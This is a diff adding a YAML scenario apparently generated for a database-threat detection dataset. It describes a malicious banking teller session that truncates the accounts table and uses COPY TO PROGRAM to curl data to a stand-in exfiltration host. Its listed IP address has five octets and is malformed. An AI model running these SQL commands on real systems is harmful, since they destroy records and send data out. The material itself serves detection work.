@@ -1,0 +1,23 @@
+scenario_id: gen_banking_19_data_tamper_mal_427
+family_id: gen_banking_19_data_tamper_mal_fam427
+domain: banking
+time_of_day: 04:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: teller
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE accounts
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 23.129.64.229.198
+      port: 9443
